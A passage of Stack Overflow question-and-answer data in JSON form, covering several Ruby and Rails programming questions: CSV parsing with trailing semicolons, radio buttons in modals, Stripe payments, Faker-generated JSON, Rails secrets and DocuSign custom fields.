"oaklodge", "link": "https://stackoverflow.com/users/467083/oaklodge"}, "reply_to_user": {"reputation": 4348, "user_id": 3435610, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/IBOFX.jpg?s=128&g=1", "display_name": "Sara Tibbetts", "link": "https://stackoverflow.com/users/3435610/sara-tibbetts"}, "edited": false, "score": 0, "creation_date": 1558592447, "post_id": 56259806, "comment_id": 99153372, "body": "Yes Sara, there is a newline in the quoted string."}], "answers": [{"comments": [{"owner": {"reputation": 19244, "user_id": 1978251, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/73f7dd539ad8ec8372af0d06e4f76939?s=128&d=identicon&r=PG", "display_name": "engineersmnky", "link": "https://stackoverflow.com/users/1978251/engineersmnky"}, "edited": false, "score": 0, "creation_date": 1558549874, "post_id": 56260189, "comment_id": 99142302, "body": "Did you test that because it doesn&#39;t work for me and it does not seem to pertain to this situation since there are no double double quoted strings"}, {"owner": {"reputation": 9663, "user_id": 5239030, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/76JEw.png?s=128&g=1", "display_name": "iGian", "link": "https://stackoverflow.com/users/5239030/igian"}, "reply_to_user": {"reputation": 19244, "user_id": 1978251, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/73f7dd539ad8ec8372af0d06e4f76939?s=128&d=identicon&r=PG", "display_name": "engineersmnky", "link": "https://stackoverflow.com/users/1978251/engineersmnky"}, "edited": false, "score": 0, "creation_date": 1558550458, "post_id": 56260189, "comment_id": 99142561, "body": "@engineersmnky, yes I did and it works in my environment (Ruby 2.6.1). I first tested the exact solution you posted and I got <code>TODO: Meaningful message in line 2. (CSV::MalformedCSVError)</code>. When I use <code>;</code> instead of <code>:auto</code> I get <code>Do not allow except col_sep_split_separator after quoted fields in line 1</code>. But I now realise it is due to Ruby version. I&#39;m going to edit."}, {"owner": {"reputation": 19244, "user_id": 1978251, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/73f7dd539ad8ec8372af0d06e4f76939?s=128&d=identicon&r=PG", "display_name": "engineersmnky", "link": "https://stackoverflow.com/users/1978251/engineersmnky"}, "edited": false, "score": 0, "creation_date": 1558557813, "post_id": 56260189, "comment_id": 99145807, "body": "that is strange I can confirm your findings in <code>2.6.1</code> however in &lt; <code>2.6</code> (tested <code>2.5.1</code>, <code>2.3.3</code>, <code>2.1.5</code>,<code>1.9.3</code>)  mine works as described below. And I really love the meaningful message :)"}, {"owner": {"reputation": 19244, "user_id": 1978251, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/73f7dd539ad8ec8372af0d06e4f76939?s=128&d=identicon&r=PG", "display_name": "engineersmnky", "link": "https://stackoverflow.com/users/1978251/engineersmnky"}, "edited": false, "score": 0, "creation_date": 1558558132, "post_id": 56260189, "comment_id": 99145935, "body": "Side note just <code>liberal_parsing: {}</code> works too seems just the key has to be present in options"}, {"owner": {"reputation": 9663, "user_id": 5239030, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/76JEw.png?s=128&g=1", "display_name": "iGian", "link": "https://stackoverflow.com/users/5239030/igian"}, "reply_to_user": {"reputation": 19244, "user_id": 1978251, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/73f7dd539ad8ec8372af0d06e4f76939?s=128&d=identicon&r=PG", "display_name": "engineersmnky", "link": "https://stackoverflow.com/users/1978251/engineersmnky"}, "edited": false, "score": 0, "creation_date": 1558589598, "post_id": 56260189, "comment_id": 99152463, "body": "@engineersmnky, fresh installed 2.6.3 and got the same issue as 2.6.1. Do you?"}, {"owner": {"reputation": 19244, "user_id": 1978251, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/73f7dd539ad8ec8372af0d06e4f76939?s=128&d=identicon&r=PG", "display_name": "engineersmnky", "link": "https://stackoverflow.com/users/1978251/engineersmnky"}, "edited": false, "score": 0, "creation_date": 1558631385, "post_id": 56260189, "comment_id": 99174048, "body": "it appears to be a change in 2.6 that causes my code to fail. Unfortuantely the OP is using 2.3.3 and has stated that not all lines end with semicolons so it just seems like the CSV itself is malformed and since the &quot;liberal parsing&quot; is not part of &lt; 2.6 I am not sure how to help from here."}], "tags": [], "owner": {"reputation": 9663, "user_id": 5239030, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/76JEw.png?s=128&g=1", "display_name": "iGian", "link": "https://stackoverflow.com/users/5239030/igian"}, "is_accepted": false, "score": 0, "last_activity_date": 1558550508, "last_edit_date": 1558550508, "creation_date": 1558538576, "answer_id": 56260189, "question_id": 56259806, "link": "https://stackoverflow.com/questions/56259806/how-to-fix-a-csv-read-error-with-a-semicolon-at-line-end/56260189#56260189", "title": "How to fix a CSV read error with a semicolon at line end", "body": "<p>Try this, <strong>for Ruby 2.6.1</strong>:</p>\n\n<pre><code>require 'pp'\nrequire 'csv'\n\nCSV.foreach(ARGV[0], col_sep: ' ', row_sep: :auto, liberal_parsing: {double_quote_outside_quote: true} ) do |row|\n    pp row\nend\n</code></pre>\n\n<p>It seems to work. See this issue: <a href=\"https://github.com/ruby/csv/issues/66\" rel=\"nofollow noreferrer\">https://github.com/ruby/csv/issues/66</a></p>\n"}, {"comments": [{"owner": {"reputation": 658, "user_id": 467083, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/e32852b0ba8af2d90ca9de291e6a8150?s=128&d=identicon&r=PG", "display_name": "oaklodge", "link": "https://stackoverflow.com/users/467083/oaklodge"}, "edited": false, "score": 0, "creation_date": 1558592476, "post_id": 56262933, "comment_id": 99153385, "body": "I apologize for not specifying this originally, but not every line will have a semicolon."}, {"owner": {"reputation": 19244, "user_id": 1978251, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/73f7dd539ad8ec8372af0d06e4f76939?s=128&d=identicon&r=PG", "display_name": "engineersmnky", "link": "https://stackoverflow.com/users/1978251/engineersmnky"}, "reply_to_user": {"reputation": 658, "user_id": 467083, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/e32852b0ba8af2d90ca9de291e6a8150?s=128&d=identicon&r=PG", "display_name": "oaklodge", "link": "https://stackoverflow.com/users/467083/oaklodge"}, "edited": false, "score": 0, "creation_date": 1558631696, "post_id": 56262933, "comment_id": 99174171, "body": "@oaklodge given that this does not appear to truly be a CSV and the line endings have no standard I am not sure exactly where to go from here. In theory you could strip all the semicolons and pass the resulting string to <code>CSV.parse</code> but I am unsure how large this file is an how intensive that might be for you. Maybe give this a try? <code>CSV.parse(File.read(ARGV[0]).gsub(&#39;;&#39;,&#39;&#39;), col_sep: &#39; &#39;)</code>"}, {"owner": {"reputation": 658, "user_id": 467083, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/e32852b0ba8af2d90ca9de291e6a8150?s=128&d=identicon&r=PG", "display_name": "oaklodge", "link": "https://stackoverflow.com/users/467083/oaklodge"}, "edited": false, "score": 0, "creation_date": 1558721669, "post_id": 56262933, "comment_id": 99207676, "body": "I gravitated to CSV because it did the important job of splitting while respecting quoted elements. I will try your solution when I&#39;m in front of my computer again. I might cheat and create a temp file chomped of trailing semicolons."}], "tags": [], "owner": {"reputation": 19244, "user_id": 1978251, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/73f7dd539ad8ec8372af0d06e4f76939?s=128&d=identicon&r=PG", "display_name": "engineersmnky", "link": "https://stackoverflow.com/users/1978251/engineersmnky"}, "is_accepted": false, "score": 1, "last_activity_date": 1558557898, "last_edit_date": 1558557898, "creation_date": 1558549790, "answer_id": 56262933, "question_id": 56259806, "link": "https://stackoverflow.com/questions/56259806/how-to-fix-a-csv-read-error-with-a-semicolon-at-line-end/56262933#56262933", "title": "How to fix a CSV read error with a semicolon at line end", "body": "<p>Since you know each row ends with a semicolon then just specify the row separator e.g. </p>\n\n<pre><code>CSV.foreach(ARGV[0],col_sep:\" \", row_sep:\";\").to_a\n#=&gt; [[\"CM_\", \"SG_\", \"1325\", \"XXX_Address\", \"XXX address\"], \n#    [\"CM_\", \"SG_\", \"612\", \"YYY_MsgCounter\", \"incremented by 1 each time a message has been transmitted\"]]\n</code></pre>\n\n<p>You will lose the new line in the row not sure how important that is though</p>\n\n<p><strong>NOTE as per my discussion with @iGian this solution is for ruby &lt; 2.6.0 and his solution is for >= 2.6.0</strong></p>\n"}], "owner": {"reputation": 658, "user_id": 467083, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/e32852b0ba8af2d90ca9de291e6a8150?s=128&d=identicon&r=PG", "display_name": "oaklodge", "link": "https://stackoverflow.com/users/467083/oaklodge"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 248, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1558592415, "creation_date": 1558537301, "last_edit_date": 1558592415, "question_id": 56259806, "link": "https://stackoverflow.com/questions/56259806/how-to-fix-a-csv-read-error-with-a-semicolon-at-line-end", "title": "How to fix a CSV read error with a semicolon at line end", "body": "<p>I want to use Ruby's CSV class to read a file:</p>\n\n<p>The file to read looks like:</p>\n\n<pre><code>CM_ SG_ 1325 XXX_Address \"XXX address\";\nCM_ SG_ 612 YYY_MsgCounter \"incremented by 1 each time a \nmessage has been transmitted\";\n</code></pre>\n\n<p>My ruby code:</p>\n\n<pre><code>#!/usr/bin/env ruby\nrequire 'pp'\nrequire 'csv'\nCSV.foreach(ARGV[0],:col_sep=&gt;\" \") do |row|\n    pp row\nend\n</code></pre>\n\n<p>This is the error I get:</p>\n\n<pre><code>C:/ruby-2.3.3-x64-mingw32/lib/ruby/2.3.0/csv.rb:1898:in `block in shift': Unclosed quoted field on l\nine 1. (CSV::MalformedCSVError)\n        from C:/ruby-2.3.3-x64-mingw32/lib/ruby/2.3.0/csv.rb:1805:in `loop'\n        from C:/ruby-2.3.3-x64-mingw32/lib/ruby/2.3.0/csv.rb:1805:in `shift'\n        from C:/ruby-2.3.3-x64-mingw32/lib/ruby/2.3.0/csv.rb:1747:in `each'\n        from C:/ruby-2.3.3-x64-mingw32/lib/ruby/2.3.0/csv.rb:1131:in `block in foreach'\n        from C:/ruby-2.3.3-x64-mingw32/lib/ruby/2.3.0/csv.rb:1282:in `open'\n        from C:/ruby-2.3.3-x64-mingw32/lib/ruby/2.3.0/csv.rb:1130:in `foreach'\n        from test.rb:4:in `&lt;main&gt;'\n</code></pre>\n\n<p>If I remove the semicolons at the end of the lines, I get this:</p>\n\n<pre><code>[\"CM_\", \"SG_\", \"1325\", \"XXX_Address\", \"XXX address\"]\n[\"CM_\",\n \"SG_\",\n \"612\",\n \"YYY_MsgCounter\",\n \"incremented by 1 each time a \\r\\nmessage has been transmitted\"]\n</code></pre>\n\n<p>which is what I would expect to see.</p>\n\n<p>I'm assuming the problem is that CSV doesn't like the semicolon up against the quote. Is there a way to chomp that semicolon off using a CSV option or give CSV a stream where I've already chomp'd it off?</p>\n\n<p><strong>Clarifications:</strong></p>\n\n<p>I apologize for not specifying this originally, <em>but not every line will have a semicolon</em>.</p>\n\n<p>Also, I would like to thank Tin Man for making superfluous edits to my post to increase his score. ;)</p>\n"}, {"tags": ["ruby-on-rails", "ruby"], "answers": [{"comments": [{"owner": {"reputation": 375, "user_id": 10409976, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/91acc14383d05b02f61e8deb0fde4c56?s=128&d=identicon&r=PG&f=1", "display_name": "b.herring", "link": "https://stackoverflow.com/users/10409976/b-herring"}, "edited": false, "score": 0, "creation_date": 1558619799, "post_id": 56261724, "comment_id": 99168026, "body": "thanks, but this is breaking it even more, as now the radio buttons and the labels dont match."}], "tags": [], "owner": {"reputation": 442, "user_id": 8500089, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/YIT6I.jpg?s=128&g=1", "display_name": "Rasna Shakya", "link": "https://stackoverflow.com/users/8500089/rasna-shakya"}, "is_accepted": false, "score": 0, "last_activity_date": 1558545298, "last_edit_date": 1558545298, "creation_date": 1558544223, "answer_id": 56261724, "question_id": 56259692, "link": "https://stackoverflow.com/questions/56259692/rendering-multiples-of-the-same-radio-buttons-error/56261724#56261724", "title": "rendering multiples of the same radio buttons error", "body": "<p>Can you correct it to this:</p>\n\n<pre><code>&lt;div class=\"modal-flex\"&gt;\n  &lt;%= f.radio_button :delete_appointment, true %&gt;\n  &lt;%= f.label :delete_appointment, \"Yes\", class: \"modal-options cancel\" %&gt;\n\n  &lt;%= f.radio_button :delete_appointment, false %&gt;\n  &lt;%= f.label :delete_appointment, \"No\", class: \"modal-options cancel\" %&gt;\n&lt;/div&gt;\n</code></pre>\n\n<p>I hope this might solve your problem.</p>\n"}, {"comments": [{"owner": {"reputation": 375, "user_id": 10409976, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/91acc14383d05b02f61e8deb0fde4c56?s=128&d=identicon&r=PG&f=1", "display_name": "b.herring", "link": "https://stackoverflow.com/users/10409976/b-herring"}, "edited": false, "score": 0, "creation_date": 1558686819, "post_id": 56279109, "comment_id": 99190161, "body": "Yes, the first record is always being updated. And yes, i&#39;m iterating through all the appointments and then rendering the form within the iteration."}, {"owner": {"reputation": 21, "user_id": 10134252, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-4gDZhXD9sRA/AAAAAAAAAAI/AAAAAAAAAio/XHMM7XXgC2A/photo.jpg?sz=128", "display_name": "Zlatan Bekric", "link": "https://stackoverflow.com/users/10134252/zlatan-bekric"}, "reply_to_user": {"reputation": 375, "user_id": 10409976, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/91acc14383d05b02f61e8deb0fde4c56?s=128&d=identicon&r=PG&f=1", "display_name": "b.herring", "link": "https://stackoverflow.com/users/10409976/b-herring"}, "edited": false, "score": 0, "creation_date": 1558688200, "post_id": 56279109, "comment_id": 99190922, "body": "@b.herring please give me a bit more details, where is your submit button, what is equal to. For modal, you need to make full modal for every instance."}], "tags": [], "owner": {"reputation": 21, "user_id": 10134252, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-4gDZhXD9sRA/AAAAAAAAAAI/AAAAAAAAAio/XHMM7XXgC2A/photo.jpg?sz=128", "display_name": "Zlatan Bekric", "link": "https://stackoverflow.com/users/10134252/zlatan-bekric"}, "is_accepted": false, "score": 1, "last_activity_date": 1558627450, "creation_date": 1558627450, "answer_id": 56279109, "question_id": 56259692, "link": "https://stackoverflow.com/questions/56259692/rendering-multiples-of-the-same-radio-buttons-error/56279109#56279109", "title": "rendering multiples of the same radio buttons error", "body": "<p>What is the value of <code>f</code> seems to me that you are constantly updating the first record?\nAre you looping through your appointments and then making the forms? Please just give a bit more details.</p>\n"}], "owner": {"reputation": 375, "user_id": 10409976, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/91acc14383d05b02f61e8deb0fde4c56?s=128&d=identicon&r=PG&f=1", "display_name": "b.herring", "link": "https://stackoverflow.com/users/10409976/b-herring"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 36, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1558686865, "creation_date": 1558536971, "last_edit_date": 1558686865, "question_id": 56259692, "link": "https://stackoverflow.com/questions/56259692/rendering-multiples-of-the-same-radio-buttons-error", "title": "rendering multiples of the same radio buttons error", "body": "<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-html lang-html prettyprint-override\"><code>&lt;%= simple_form_for :appointment, url: delete_admin_appointment_path(appointment) do |f| %&gt;</code></pre>\r\n</div>\r\n</div>\r\n</p>\n\n<p>I have a rails application , where on my appointments index table, i have the option to cancel an appointment (in the form of a modal). However im using radio buttons on the modal. This works fine for the very first appointment, but if I try to click on any other radio buttons for the other appointments, they arent clickable because they are actually changing the radio buttons on the first appointment instead. So i basically need to make each modals radio buttons unique to that modal so they dont change any others, but im not sure how. thanks</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-html lang-html prettyprint-override\"><code> &lt;div class=\"modal-flex\"&gt;\r\n          &lt;%= f.radio_button :delete_appointment, :true %&gt;\r\n          &lt;%= f.label :delete_appointment_true, \"Yes\", class: \"modal-options cancel\" %&gt;\r\n     \r\n          &lt;%= f.radio_button :delete_appointment, :false %&gt;\r\n          &lt;%= f.label :delete_appointment_false, \"No\", class: \"modal-options cancel\" %&gt;\r\n          \r\n&lt;/div&gt;</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "stripe-payments"], "comments": [{"owner": {"reputation": 1306, "user_id": 8008340, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/15JhO.jpg?s=128&g=1", "display_name": "Konstantin Strukov", "link": "https://stackoverflow.com/users/8008340/konstantin-strukov"}, "edited": false, "score": 0, "creation_date": 1558538422, "post_id": 56259469, "comment_id": 99136864, "body": "Not sure I understand: what is the problem to create 2 charges using the existing tools - a standard one time and a subscription?"}, {"owner": {"reputation": 150540, "user_id": 128421, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/71770d043c0f7e3c7bc5f74190015c26?s=128&d=identicon&r=PG", "display_name": "the Tin Man", "link": "https://stackoverflow.com/users/128421/the-tin-man"}, "edited": false, "score": 0, "creation_date": 1558571204, "post_id": 56259469, "comment_id": 99149206, "body": "Please read <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">stackoverflow.com/help/minimal-reproducible-example</a>. We need to see your attempt to solve it with the minimum code necessary to reproduce the problem. Without that it looks like you&#39;re asking us to write the code for you."}, {"owner": {"reputation": 1585, "user_id": 10755574, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-L8oBhtIhUP0/AAAAAAAAAAI/AAAAAAAAAAk/ouR69UmgfTw/photo.jpg?sz=128", "display_name": "Chengmin", "link": "https://stackoverflow.com/users/10755574/chengmin"}, "edited": false, "score": 0, "creation_date": 1558577883, "post_id": 56259469, "comment_id": 99150361, "body": "Hi Tin Man, Thanks for your guide. I checked Stripe API doc and wrote my code like above, but no luck yet."}], "answers": [{"tags": [], "owner": {"reputation": 1585, "user_id": 10755574, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-L8oBhtIhUP0/AAAAAAAAAAI/AAAAAAAAAAk/ouR69UmgfTw/photo.jpg?sz=128", "display_name": "Chengmin", "link": "https://stackoverflow.com/users/10755574/chengmin"}, "is_accepted": true, "score": 0, "last_activity_date": 1558614849, "creation_date": 1558614849, "answer_id": 56275344, "question_id": 56259469, "link": "https://stackoverflow.com/questions/56259469/stripe-one-time-payment-recurring-payment/56275344#56275344", "title": "Stripe One Time Payment + Recurring Payment", "body": "<p>I found the answer.</p>\n\n<p>1) You need to create a plan in stripe dashboard. (For this code I created a plan with monthly_fee)</p>\n\n<p>2) You can add below code to your file</p>\n\n<pre><code>customer = Stripe::Customer.create(\n  :email =&gt; \"user@user.user\",\n  :source  =&gt; params[:stripeToken]\n)\n\ninvoiceItem = Stripe::InvoiceItem.create({\n  :customer    =&gt; customer.id,\n  :amount      =&gt; 100,\n  :currency    =&gt; 'usd',\n  :description =&gt; 'subscription Payment'\n})\n\ncharge = Stripe::Subscription.create(\n  :customer =&gt; customer,\n  :items =&gt; [\n    {\n      :plan =&gt; \"monthly_fee\",\n      :quantity =&gt; 5\n    },\n  ]\n)\n</code></pre>\n\n<p>Hope this help the others who face the same case.\nThanks</p>\n"}], "owner": {"reputation": 1585, "user_id": 10755574, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-L8oBhtIhUP0/AAAAAAAAAAI/AAAAAAAAAAk/ouR69UmgfTw/photo.jpg?sz=128", "display_name": "Chengmin", "link": "https://stackoverflow.com/users/10755574/chengmin"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 249, "favorite_count": 1, "accepted_answer_id": 56275344, "answer_count": 1, "score": -1, "last_activity_date": 1558614849, "creation_date": 1558536335, "last_edit_date": 1558577713, "question_id": 56259469, "link": "https://stackoverflow.com/questions/56259469/stripe-one-time-payment-recurring-payment", "title": "Stripe One Time Payment + Recurring Payment", "body": "<p>I checked stripe api doc, but can not find the solution for (product_price + monthly_fee) model.\nI can see Stripe::Charge.create is for one time payment and subscription is for recurring payment.\nGuide link or Sample code would be very thankful.\nI tried with below code, but no success yet.</p>\n\n<pre><code>def save_and_pay(params)\n  customer = Stripe::Customer.create(\n    :email =&gt; subscription.user.email,\n    :source  =&gt; params[:stripeToken]\n  )\n  subscription.user.update(gateway_customer_id: customer.id, is_active: true)\n  charge = Stripe::Charge.create(\n    :customer    =&gt; customer.id,\n    :amount      =&gt; (subscription.plan_price * 100).to_i,\n    :currency    =&gt; 'usd',\n    :description =&gt; 'subscription Payment'\n  )\n  self.payment_status = charge.paid\n  self.payment_response = charge.status\n  self.save    \nend\n</code></pre>\n\n<p>Thanks</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "faker"], "answers": [{"tags": [], "owner": {"reputation": 3580, "user_id": 1680728, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/844cd73e8700d810d7cc207cba7da3bd?s=128&d=identicon&r=PG&f=1", "display_name": "Felix", "link": "https://stackoverflow.com/users/1680728/felix"}, "is_accepted": false, "score": 0, "last_activity_date": 1558534302, "creation_date": 1558534302, "answer_id": 56258841, "question_id": 56258332, "link": "https://stackoverflow.com/questions/56258332/how-to-send-fake-json-data-in-a-rails-response/56258841#56258841", "title": "How to send fake JSON data in a Rails response", "body": "<p>Yes, Chuck Norris can use the <a href=\"https://github.com/stympy/faker/\" rel=\"nofollow noreferrer\">Faker gem</a>.</p>\n\n<pre><code>def dummy_response\n data = {fact: Faker::ChuckNorris.fact}\n render :json =&gt; data, status: 200\nend\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 6039, "user_id": 2137458, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8cfca832ee746f3e3d9971148f52dc64?s=128&d=identicon&r=PG", "display_name": "NM Pennypacker", "link": "https://stackoverflow.com/users/2137458/nm-pennypacker"}, "is_accepted": true, "score": 1, "last_activity_date": 1558534825, "creation_date": 1558534825, "answer_id": 56259015, "question_id": 56258332, "link": "https://stackoverflow.com/questions/56258332/how-to-send-fake-json-data-in-a-rails-response/56259015#56259015", "title": "How to send fake JSON data in a Rails response", "body": "<p>You could do something like this: </p>\n\n<pre><code>data_hash = {}\n100.times { |x| data_hash[x] = { name: Faker::Name.first_name } }\nrender json: data_hash.to_json, status: 200\n</code></pre>\n"}], "owner": {"reputation": 6207, "user_id": 5117953, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/Ca0RW.jpg?s=128&g=1", "display_name": "Vishal", "link": "https://stackoverflow.com/users/5117953/vishal"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 408, "favorite_count": 0, "accepted_answer_id": 56259015, "answer_count": 2, "score": 1, "last_activity_date": 1558571455, "creation_date": 1558532734, "last_edit_date": 1558571455, "question_id": 56258332, "link": "https://stackoverflow.com/questions/56258332/how-to-send-fake-json-data-in-a-rails-response", "title": "How to send fake JSON data in a Rails response", "body": "<p>I know we can generate fake data with <a href=\"https://github.com/stympy/faker\" rel=\"nofollow noreferrer\">faker</a> in Ruby.</p>\n\n<p>I want to send fake data from the API in the response. Currently, I generated a dummy response in the <code>public/data.json</code> file which has only three static objects. </p>\n\n<pre><code>def dummy_response\n data = File.read(\"#{Rails.root}/public/data.json\")\n render :json =&gt; data, status: 200\nend\n</code></pre>\n\n<p>I have to send 100 dummy objects with random values. Can I use the <code>yml</code> file to send dummy data or with faker gem generate dummy JSON and send it back in response?</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "heroku"], "comments": [{"owner": {"reputation": 51013, "user_id": 976775, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/30bd66ad1795804aebe249d8bcb14409?s=128&d=identicon&r=PG", "display_name": "MrYoshiji", "link": "https://stackoverflow.com/users/976775/mryoshiji"}, "edited": false, "score": 1, "creation_date": 1558532435, "post_id": 56257716, "comment_id": 99132987, "body": "This is related to the way YAML parses the values, same as for strings &quot;yes&quot; and &quot;no&quot; in YAML which get converted to booleans (<a href=\"https://makandracards.com/makandra/24809-yaml-keys-like-yes-or-no-evaluate-to-true-and-false\" rel=\"nofollow noreferrer\">makandracards.com/makandra/&hellip;</a>"}], "owner": {"reputation": 47, "user_id": 4379876, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8a74b2eaf51d6ab237c7b929c8417713?s=128&d=identicon&r=PG&f=1", "display_name": "Hazimi Asyraf", "link": "https://stackoverflow.com/users/4379876/hazimi-asyraf"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 115, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1558534593, "creation_date": 1558530862, "last_edit_date": 1558534593, "question_id": 56257716, "link": "https://stackoverflow.com/questions/56257716/rails-secrets-returns-boolean-but-rails-env-returns-string", "title": "Rails Secrets returns boolean, but Rails ENV returns string", "body": "<p>I have a Ruby on Rails app in Heroku. On Heroku, I have an environment variable, for example, THIS_APP_IS_COOL and having a value of true. If I call ENV['THIS_APP_IS_COOL'], it'll return 'true' (string). In my Rails secrets (yaml-file), I have as below</p>\n\n<pre><code>this_app_is_cool: &lt;%= ENV['THIS_APP_IS_COOL'] %&gt;\n</code></pre>\n\n<p>When I call Rails.application.secrets.this_app_is_cool, it returns true (boolean) instead. Is this automatic conversion a Rails secrets thing? And what are some good practices to avoid this kind of thing?</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "docusignapi"], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 7132303, "user_type": "registered", "profile_image": "https://graph.facebook.com/10154631262198361/picture?type=large", "display_name": "Thomas Chauffour", "link": "https://stackoverflow.com/users/7132303/thomas-chauffour"}, "edited": false, "score": 0, "creation_date": 1558603069, "post_id": 56261770, "comment_id": 99158674, "body": "Thanks for your precisions !  So i&#39;d like to set the customs fields of a new envelope (before send it). I don&#39;t understand how to set the values with the ruby sdk..."}, {"owner": {"reputation": 42798, "user_id": 64904, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/d18e711c1855012728c3a5782cfcc3ad?s=128&d=identicon&r=PG", "display_name": "Larry K", "link": "https://stackoverflow.com/users/64904/larry-k"}, "reply_to_user": {"reputation": 1, "user_id": 7132303, "user_type": "registered", "profile_image": "https://graph.facebook.com/10154631262198361/picture?type=large", "display_name": "Thomas Chauffour", "link": "https://stackoverflow.com/users/7132303/thomas-chauffour"}, "edited": false, "score": 0, "creation_date": 1558637456, "post_id": 56261770, "comment_id": 99176533, "body": "Hmmm, I haven&#39;t written ruby code for about a decade. I&#39;ll give it a go when I have a bit of time."}], "tags": [], "owner": {"reputation": 42798, "user_id": 64904, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/d18e711c1855012728c3a5782cfcc3ad?s=128&d=identicon&r=PG", "display_name": "Larry K", "link": "https://stackoverflow.com/users/64904/larry-k"}, "is_accepted": false, "score": 0, "last_activity_date": 1558544455, "creation_date": 1558544455, "answer_id": 56261770, "question_id": 56257643, "link": "https://stackoverflow.com/questions/56257643/docusign-api-ruby-how-to-set-predefined-custom-fields-for-an-envelope-creation/56261770#56261770", "title": "Docusign API Ruby: How to set predefined Custom Fields for an Envelope creation?", "body": "<p>The <code>envelope_definition.custom_fields</code> attribute takes a single instance of <code>custom_fields</code>. (Not an array)</p>\n\n<p><code>custom_fields</code> is an object that has two attributes:</p>\n\n<p><code>list_custom_fields</code> wants an <strong>array</strong> of <code>ListCustomField</code></p>\n\n<p><code>text_custom_fields</code> wants an <strong>array</strong> of <code>TextCustomField</code></p>\n\n<p>Based on the above, can you redo your request? </p>\n"}], "owner": {"reputation": 1, "user_id": 7132303, "user_type": "registered", "profile_image": "https://graph.facebook.com/10154631262198361/picture?type=large", "display_name": "Thomas Chauffour", "link": "https://stackoverflow.com/users/7132303/thomas-chauffour"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 62, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1558781165, "creation_date": 1558530678, "last_edit_date": 1558781165, "question_id": 56257643, "link": "https://stackoverflow.com/questions/56257643/docusign-api-ruby-how-to-set-predefined-custom-fields-for-an-envelope-creation", "title": "Docusign API Ruby: How to set predefined Custom Fields for an Envelope creation?", "body": "<p>I created some enveloppe custom fields in the admin of Docusign.\nSo I'd to know how to set their value when I create an enveloppe from the docusign Ruby API.</p>\n\n<p><a href=\"https://i.stack.imgur.com/oarmr.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/oarmr.png\" alt=\"enter image description here\"></a></p>\n\n<p>I've tried to set there like this, but it doesn't work. When I send the envelope the custom fields are not filled.</p>\n\n<pre class=\"lang-rb prettyprint-override\"><code>envelope_definition = DocuSign_eSign::EnvelopeDefinition.new\n\ncustom_fields = DocuSign_eSign::CustomFieldsEnvelope.new(\n{\"name\":\"enveloppe_annee\",\"value\":\"2019\"}\n)\n\nenvelope_definition.custom_fields = [custom_fields]\n</code></pre>\n"}, {"tags": ["ruby"], "comments": [{"owner": {"reputation": 80852, "user_id": 2483313, "user_type": "registered", "profile_image": 